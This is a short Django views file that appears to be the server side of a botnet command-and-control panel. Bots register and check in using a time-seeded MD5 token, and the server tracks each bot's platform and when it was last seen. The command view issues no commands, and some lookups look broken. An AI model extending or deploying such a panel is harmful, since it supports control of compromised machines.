from django.shortcuts import render
from django.views.decorators.csrf import csrf_exempt
from .models import Bot
import time, hashlib

# Create your views here.
def index(request):
    return render(request, 'index.html')


@csrf_exempt
def reg(request):
    botId = request.POST.get('botId', False)
    botName = request.POST.get('botName', False)
    auth = request.POST.get('auth', False)
    botPlat = request.POST.get('platform', False)
    t = request.POST.get('t', False)
    if botId and botName and botPlat and t and auth == genTimeSeed():
        exists = Bot.objects.get(botId=botId)
        if not exists:
            bot = Bot(botId=botId, botName=botName, lastSeen=t, platform=botPlat)
            bot.save()
            return render(request, 'botAdded.html')
        exists.lastSeen = t
        exists.save()
        return render(request, 'index.html')
    return render(request, 'authFail.html')



def cmd(request):
    params = request.POST
    botId = params.get('botId', False)
    t = params.get('t', False)
    auth = params.get('auth', False)
    if botId and t and auth == genTimeSeed():
        bot = Bot.objects.get(botId=botId)
        if bot:
            bot.lastSeen = t
            bot.save()
    return render(request, 'index.html')


def genTimeSeed():
    seed = roundDown(int(time.time()), 5)
    return hashlib.md5(str(seed)).hexdigest()

def roundDown(num, factor):
    return num - (num%factor)